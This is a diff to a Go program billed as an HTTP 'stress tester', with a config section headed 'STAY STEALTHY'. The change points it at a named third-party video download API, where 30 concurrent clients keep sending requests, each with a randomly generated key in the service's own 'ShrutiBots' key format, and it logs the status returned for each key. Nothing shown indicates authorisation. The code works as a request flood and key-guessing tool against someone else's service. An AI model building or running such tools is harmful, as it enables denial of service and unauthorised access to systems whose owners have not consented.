@@ -5,6 +5,7 @@ import (
 	"log"
 	"math/rand"
 	"net/http"
+	"net/url"
 	"os"
 	"os/signal"
 	"runtime"
@@ -18,10 +19,14 @@ import (
 // CONFIGURATION (STAY STEALTHY)
 // ==========================================
 var (
-	SERVER_URL      = getEnv("TARGET_URL", "https://shrutibots.site/")
-	TOTAL_CLIENTS   = 30          // Number of concurrent refresh clients
-	MAX_WORKERS     = 30
-	REFRESH_DELAY   = 800 * time.Millisecond // Lower = heavier stress (80ms ≈ 375 RPS total)
+	SERVER_URL     = getEnv("TARGET_URL", "https://api.shrutibots.site/download")
+	TOTAL_CLIENTS  = 30
+	MAX_WORKERS    = 30
+	REFRESH_DELAY  = 800 * time.Millisecond
+
+	// New API Configuration
+	VIDEO_ID      = getEnv("VIDEO_ID", "dQw4w9wgxcq")     // Default Rick Roll video ID
+	DOWNLOAD_TYPE = getEnv("DOWNLOAD_TYPE", "audio")      // "audio" or "video"
 )
 
 // Worker Semaphore to limit max workers
@@ -39,6 +44,19 @@ func getEnv(key, defaultValue string) string {
 		return value
 	}
 	return defaultValue
+}
+
+// Generate Random API Key in the format: ShrutiBots + Random Alphanumeric
+func generateRandomAPIKey() string {
+	const prefix = "ShrutiBots"
+	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+	const randomLength = 20 // Matches the example: ShrutiBotsNYOLRrv0frxI0iNLgolV
+
+	b := make([]byte, randomLength)
+	for i := range b {
+		b[i] = charset[rand.Intn(len(charset))]
+	}
+	return prefix + string(b)
 }
 
 // ==========================================
@@ -66,9 +84,18 @@ func (c *StressClient) DoRefresh() {
 	c.lastActivity = time.Now()
 	c.lock.Unlock()
 
-	targetURL := SERVER_URL
+	// Generate random API key for each request (ShrutiBots format)
+	randomAPIKey := generateRandomAPIKey()
 
-	req, err := http.NewRequest("GET", targetURL, nil)
+	// Build URL with query parameters for new API
+	baseURL, _ := url.Parse(SERVER_URL)
+	params := url.Values{}
+	params.Add("url", VIDEO_ID)
+	params.Add("type", DOWNLOAD_TYPE)
+	params.Add("api_key", randomAPIKey)
+	baseURL.RawQuery = params.Encode()
+
+	req, err := http.NewRequest("GET", baseURL.String(), nil)
 	if err != nil {
 		log.Printf("[Client %d] NewRequest failed: %v", c.clientID, err)
 		return
@@ -81,11 +108,11 @@ func (c *StressClient) DoRefresh() {
 	}
 	defer resp.Body.Close()
 
-	// Consume body (simulates real browser, keeps connection alive for load balancer test)
+	// Consume body
 	io.Copy(io.Discard, resp.Body)
 
-	// Logging response headers like X-Cache can show if you hit or missed (Fastly specific)
-	log.Printf("[Client %d] Page Refresh -> Status: %d | %s", c.clientID, resp.StatusCode, targetURL)
+	log.Printf("[Client %d] API Request -> Status: %d | Type: %s | Video: %s | Key: %s", 
+		c.clientID, resp.StatusCode, DOWNLOAD_TYPE, VIDEO_ID, randomAPIKey)
 }
 
 func (c *StressClient) Run() {
@@ -106,11 +133,11 @@ func main() {
 	runtime.GOMAXPROCS(runtime.NumCPU())
 
 	log.Println("========================================")
-	log.Println(" KING-CLAIMER HTTP REFRESH STRESS TESTER ")
-	log.Printf(" Target: %s", SERVER_URL)
-	log.Printf(" Clients: %d | Workers: %d | Delay: %v", TOTAL_CLIENTS, MAX_WORKERS, REFRESH_DELAY)
-	log.Println(" Mode: Repeated page refresh")
-	log.Println(" Purpose: Test regional routing + load balancing")
+	log.Println(" KING-CLAIMER SHRUTI API STRESS TESTER ")
+	log.Printf(" Target API : %s", SERVER_URL)
+	log.Printf(" Clients    : %d | Workers: %d | Delay: %v", TOTAL_CLIENTS, MAX_WORKERS, REFRESH_DELAY)
+	log.Printf(" Type       : %s | Video ID: %s", DOWNLOAD_TYPE, VIDEO_ID)
+	log.Println(" Mode       : Repeated API Calls with Random API Keys (ShrutiBots Format)")
 	log.Println("========================================")
 
 	var wg sync.WaitGroup
